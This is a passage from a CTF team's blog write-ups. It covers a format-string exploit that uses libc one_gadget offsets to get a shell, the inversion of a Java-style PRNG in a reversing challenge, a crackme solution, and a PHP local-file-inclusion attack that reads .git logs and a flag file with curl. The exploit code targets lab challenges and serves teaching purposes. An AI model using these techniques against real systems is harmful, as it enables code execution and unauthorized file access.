+</span></span><span style=display:flex><span>    <span style=color:#75715e># I don&#39;t usually check if the given constraints are respected, I just try them.</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># </span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># $ onegadget libc6_2.31-0ubuntu9.2_amd64.so</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># 0xe6c7e execve(&#34;/bin/sh&#34;, r15, r12)</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># constraints:</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e>#   [r15] == NULL || r15 == NULL</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e>#   [r12] == NULL || r12 == NULL</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># </span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># 0xe6c81 execve(&#34;/bin/sh&#34;, r15, rdx)</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># constraints:</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e>#   [r15] == NULL || r15 == NULL</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e>#   [rdx] == NULL || rdx == NULL</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># </span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># 0xe6c84 execve(&#34;/bin/sh&#34;, rsi, rdx)</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># constraints:</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e>#   [rsi] == NULL || rsi == NULL</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e>#   [rdx] == NULL || rdx == NULL</span>
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Send the payload</span>
+</span></span><span style=display:flex><span>    onegadget <span style=color:#f92672>=</span> libc<span style=color:#f92672>.</span>address <span style=color:#f92672>+</span> <span style=color:#ae81ff>0xe6c81</span>
+</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> fmtstr_payload(offset, {rip: onegadget})
+</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>sendline(payload)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Profit</span>
+</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>interactive()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
+</span></span><span style=display:flex><span>    main()
+</span></span></code></pre></div><p>Notice that this exploit sometimes fails to execute for unknown reasons.</p><h3 id=the-flag-7>The Flag</h3><p>We can then <code>cat flag.txt</code> and get the flag: <code>UDCTF{write-what-wear-pantz-660714392699745151725739719383302481806841115893230100153376}</code></p><h3 id=conclusions-1>Conclusions</h3><p>I usually dislike format string vulnerabilities. They are tedious and, let me say this, dumb. Even the compiler knows that you are doing something wrong and gives you a warning if you attempt to compile something with a format string vulnerability in it.</p><p>Nonetheless, I enjoyed this challenge a lot. Executing a ropchain via format string was very funny and a good learning experience.</p><h1 id=reverse>Reverse</h1><h2 id=entropy-points-468>Entropy (points 468)</h2><h3 id=description-9>Description</h3><p>If you can find a 12-eye you can do this&mldr;</p><p>Author: ProfNinja</p><p><em>entropy</em></p><h3 id=gathering-information-9>Gathering information</h3><p>The challenge gives us a binary called entropy, which requires an argument, print it as number and gives us segfault.</p><p>By reversing it with ghidra, we can see that it applies a function to our argument, and uses it as a key to translate a function, which is then called.</p><p>The code gives us a hint, telling us we&rsquo;re good if the provided argument, after 100 execution of the mysterious function, is equal to 0xfd94e6e84a0a.</p><p>The argument is updated each time using the following line:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-C data-lang=C><span style=display:flex><span>param_1 <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>param_1 <span style=color:#f92672>*</span> <span style=color:#ae81ff>0x5deece66d</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0xb</span> <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xffffffffffff</span>
+</span></span></code></pre></div><p>By googlin its values, we find out that this is the random function used in java.util.Random!
+This is known to be not secure, and we can find the inverse function on <a href=https://stackoverflow.com/questions/15236151/inverse-function-of-javas-random-function>stackoverflow</a>.</p><h3 id=exploitation-9>Exploitation</h3><p>We create a simple program to obtain the right value required as argument:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-C data-lang=C><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span> <span style=color:#a6e22e>reverse</span>(<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span><span style=color:#f92672>*</span> key){
+</span></span><span style=display:flex><span>    <span style=color:#f92672>*</span>key <span style=color:#f92672>=</span> ((<span style=color:#f92672>*</span>key <span style=color:#f92672>-</span> <span style=color:#ae81ff>0xBL</span>) <span style=color:#f92672>*</span> <span style=color:#ae81ff>0xdfe05bcb1365L</span>) <span style=color:#f92672>&amp;</span> ((<span style=color:#ae81ff>1L</span> <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>48</span>) <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#f92672>*</span>key;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(){
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span> key <span style=color:#f92672>=</span>  <span style=color:#ae81ff>0xfd94e6e84a0a</span>;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span>(<span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>100</span>; i<span style=color:#f92672>++</span>)
+</span></span><span style=display:flex><span>        reverse(<span style=color:#f92672>&amp;</span>key);
+</span></span><span style=display:flex><span>    printf(<span style=color:#e6db74>&#34;%lx</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, key);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>Now we have our argument, which is 0x483d34347a46.</p><p>So, let&rsquo;s execute <code>./entropy $(python -c "print('\x46\x7a\x34\x34\x3d\x48')"\)</code> and we get:</p><pre tabindex=0><code>Fz44=H
+79427706059334
+looking good
+</code></pre><p>This means it&rsquo;s working, but still we get segmentation fault and can&rsquo;t read the flag.
+By debugging it with gdb, we can clearly read that it executes the function and push the flag onto the stack. So we can just read it from here before the execution produces the segfault.</p><pre tabindex=0><code> ► 0x555555601020    xor    rbx, rbx
+   0x555555601023    push   rbx
+   0x555555601024    push   0x7d307470
+   0x555555601029    push   0x7972635f
+   0x55555560102e    push   0x76756c5f
+   0x555555601033    push   0x7961735f
+   0x555555601038    push   0x495f6e34
+   0x55555560103d    push   0x635f7434
+   0x555555601042    push   0x68777b46
+   0x555555601047    push   0x54434455
+   0x55555560104c    mov    rax, 1
+</code></pre><p>So, let&rsquo;s just convert the hex string using cyberchef and reverse it.</p><h3 id=the-flag-8>The Flag</h3><p>UDCTF{wh4t_c4n_I_say_luv_crypt0}</p><h3 id=conclusion-6>Conclusion</h3><p>The writeup make the challenge looks easy, but this was indeed pretty hard (mostly the part of finding the inverse of the PRNG). Still, had fun!</p><h2 id=me-crack-296>Me, Crack (296)</h2><h3 id=description-10>Description</h3><p>Classic Password Cracking re-imagined for a new generation.
+<a href=https://gist.github.com/AndyNovo/9d9b8ddc5b09e9f3e6203eb3cbfc19a1>Challenge source</a></p><h3 id=gathering-information-10>Gathering Information</h3><p>We are given the code to spawn a <code>book and quill</code> with the code to run on the MC86 machine.
+The first page of the book asks us to write the flag on another book, one character per page.
+We can then guess that the code on book checks if the flag is the correct one.
+Looking at the code we can see that the functioon checks pages 0 to 15, so our flag will be 16 characters long.
+For each page, the function reads the character on it and does 3 different operations, with 2 variables, arg1 and arg2.
+arg2 is set before an operation occurs, while arg1 is the result of the previous, except for the first one.
+After the three operation, arg1 is compared to xval, which is the ASCII code of our character.</p><h3 id=exploitation-10>Exploitation</h3><p>Given that the same operations are done for each page, we can extract the 4 numbers used and put them in 4 different arrays.
+To find out all the characters, we can just translate the result of the third operation to a character for every page.</p><pre tabindex=0><code>a = [68, 1, 8, 15, 9, 12, 67, 2, 19, 28, 320, 62, 12, 17, 33, 86]
+b = [235, 399, 193, 377, 551, 181, 294, 459, 901, 555, 71, 218, 242, 151, 680, 31]
+c = [17, 19, 178, 365, 17, 63, 139, 37, 793, 522, 1, 144, 84, 81, 305, 19]
+d = [663, 350, 331, 848, 223, 176, 760, 148, 992, 552, 838, 972, 973, 183, 756, 256]
+
+flag = &#34;&#34;
+for i in range(16):
+	a[i] = a[i] * b[i]
+	a[i] = a[i] + c[i]
+	a[i] = a[i] % d[i]
+	flag += chr(a[i])
+print(flag)
+</code></pre><p>Now we can run the script and find out the flag.</p><h3 id=flag-1>Flag</h3><p><code>UDCTF{MC86_4EVA}</code></p><h3 id=conclusion-7>Conclusion</h3><p>This challenge is a nice introduction to reverse engineering, beginners can easily solve it without knowledge of any tool.</p><h1 id=web>Web</h1><h2 id=ctfvc-100>ctfvc (100)</h2><h3 id=description-11>Description</h3><blockquote><p>challenges.ctfd.io:30595</p></blockquote><blockquote><p>find flag.txt</p></blockquote><h3 id=gathering-information-11>Gathering information</h3><p>We are given an IP to connect to.</p><p>When opening the web page we are greated with some php code:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span> <span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;file&#39;</span>])){
+</span></span><span style=display:flex><span>    $file <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;file&#39;</span>];
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>strpos</span>($file, <span style=color:#e6db74>&#34;..&#34;</span>) <span style=color:#f92672>===</span> <span style=color:#66d9ef>false</span>){
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>include</span>(<span style=color:#66d9ef>__DIR__</span> <span style=color:#f92672>.</span> $file);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#75715e>//Locked down with version control waddup 
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>highlight_file</span>(<span style=color:#66d9ef>__FILE__</span>, <span style=color:#66d9ef>true</span>);
+</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></span></span></code></pre></div><p>This seems like a perfect <code>LFI</code> vulnerabilty, but, as we can see from the source code, we can&rsquo;t climb back in the directory hierarchy.</p><p>The name of the challenge and the comment in the source suggests that we might have a <code>.git</code> directory somewhere.</p><p>Let&rsquo;s try to access the directory:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>&gt; curl http://challenges.ctfd.io:30595/.git/
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>...
+</span></span><span style=display:flex><span>&lt;title&gt;403 Forbidden&lt;/title&gt;
+</span></span><span style=display:flex><span>&lt;/head&gt;&lt;body&gt;
+</span></span><span style=display:flex><span>&lt;h1&gt;Forbidden&lt;/h1&gt;
+</span></span><span style=display:flex><span>&lt;p&gt;You don&#39;t have permission to access this resource.&lt;/p&gt;
+</span></span><span style=display:flex><span>...
+</span></span></code></pre></div><p>Okay, so we have a <code>.git</code> directory, but we can&rsquo;t access it, let&rsquo;s exploit our vulnerabilty.</p><h3 id=exploitation-11>Exploitation</h3><p>We can use the vulnerability to see if we can find something interesting in the <code>.git</code> directory:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>&gt; curl http://challenges.ctfd.io:30595/?file<span style=color:#f92672>=</span>/.git/logs/refs/heads/master
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>0000000000000000000000000000000000000000 862ff4b638b509e5fe354d3a93e49712f0684887 Sucks At &lt;sucks@web.sec&gt; 1615233879 +0000     commit (initial): not including flag directory 1a2220dd8c13c32e in the version control system
+</span></span><span style=display:flex><span>...
+</span></span></code></pre></div><p>We have an interesting commit log in the <code>.git/logs/refs/heads</code> directory, where a directory named <code>1a2220dd8c13c32e</code> is referenced.</p><p>Let&rsquo;s see if we can exfiltrate that thanks to the vulnerability.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>&gt; curl http://challenges.ctfd.io:30595/?file<span style=color:#f92672>=</span>/1a2220dd8c13c32e/flag.txt
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>UDCTF{h4h4_suck3rs_i_t0tally_l0ck3d_th1s_down}
+</span></span><span style=display:flex><span>...
+</span></span></code></pre></div><p>And sure enough we have our flag!</p><h3 id=the-flag-9>The Flag</h3><p><code>UDCTF{h4h4_suck3rs_i_t0tally_l0ck3d_th1s_down}</code></p><h3 id=conclusion-8>Conclusion</h3><p>This challenge was a nice introduction to local file inclusion vulnerabilites, requiring also a bit of git knowledge to get the flag.</p></div></article></main></div><footer class=footer><div class=footer__inner><div class=footer__content><span>&copy; 2022</span>
+<span><a href=https://madrhacks.github.io/posts/index.xml target=_blank title=rss><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></span></div></div><div class=footer__inner><div class=footer__content><span>Powered by <a href=http://gohugo.io>Hugo</a></span>
+<span>Made with &#10084;</span></div></div></footer></div><script type=text/javascript src=https://madrhacks.github.io/bundle.min.fbf016a5f89be88f4916a0898302f777692ee6600991c3b6108fc423ed982dc83b470742cc92dd796861136f5ca96988b35e049b5f4cb4b1343686784a58c8ce.js integrity="sha512-+/AWpfib6I9JFqCJgwL3d2ku5mAJkcO2EI/EI+2YLcg7RwdCzJLdeWhhE29cqWmIs14Em19MtLE0NoZ4SljIzg=="></script></body></html>
